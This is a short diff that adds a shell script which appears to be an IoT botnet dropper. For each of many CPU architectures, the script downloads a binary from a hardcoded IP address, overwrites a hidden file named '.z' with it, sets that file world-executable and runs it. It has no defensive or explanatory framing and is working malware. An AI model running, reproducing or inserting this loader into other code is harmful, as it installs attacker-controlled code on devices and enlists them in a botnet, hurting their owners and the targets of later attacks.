@@ -1,0 +1,13 @@
+#!/bin/sh
+u=".z"
+bin_names="arm4 arm5 arm6 arm7 armv4eb armv4tl mips64 mips mipsel powerpc ppc440 m68k sh4 sparc x86_64 i686"
+http_server="45.95.55.214"
+for name in $bin_names
+    do
+    rm -rf $u
+    cp $SHELL $u
+    chmod 777 $u
+    >$u
+    wget http://$http_server/scooter/$name -O -> $u
+    ./$u wget.$1.$name
+done
